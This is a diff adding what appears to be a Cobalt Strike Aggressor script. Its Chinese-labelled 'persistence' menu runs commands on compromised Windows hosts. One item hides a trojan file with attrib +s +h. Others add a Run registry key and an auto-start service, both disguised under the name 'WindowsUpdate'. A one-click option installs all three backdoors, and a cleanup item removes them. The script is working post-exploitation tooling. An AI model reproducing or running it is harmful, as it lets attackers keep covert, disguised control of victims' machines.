@@ -1,0 +1,54 @@
+# refer:
+	# https://www.freebuf.com/articles/system/229209.html
+	# https://xz.aliyun.com/t/5881#toc-2
+
+menu "权限维持" {
+	item "设置木马路径" {
+		local('$bid');
+		foreach $bid ($1){
+			prompt_text("filePath", $filePath, {
+				$filePath = $1;
+				return $filePath;
+			});
+		}
+	}
+	item "隐藏木马" {
+        local('$bid');
+        foreach $bid ($1){
+			# attrib C:\test.exe +s +h
+            bshell($1, "attrib \"$filePath\" +s +h");
+        }
+	}
+	item "注册表自启"{
+        local('$bid');
+        foreach $bid ($1){
+			# 添加到注册表
+            bshell($1, "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d \"$filePath\" /f");
+        }
+	}
+	item "自启动服务后门"{
+		local('$bid');
+		foreach $bid ($1){
+			bshell($1, "sc create \"WindowsUpdate\" binpath= \"cmd /c start \"$filePath\"\"&&sc config \"WindowsUpdate\" start= auto&&net start WindowsUpdate");
+
+		}
+	}
+    item "一键加后门" {
+        local('$bid');
+		foreach $bid ($1){
+			bshell($1, "attrib \"$filePath\" +s +h");
+			bshell($1, "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d \"$filePath\" /f");
+			bshell($1, "sc create \"WindowsUpdate\" binpath= \"cmd /c start \"$filePath\"\"&&sc config \"WindowsUpdate\" start= auto&&net start WindowsUpdate");
+		}
+
+    }
+	item "清除所有后门"{
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "attrib \"$filePath\" -s -h");
+            bshell($1, "reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /f");
+			bshell($1, "sc delete \"WindowsUpdate\"");
+        }
+	}
+
+}
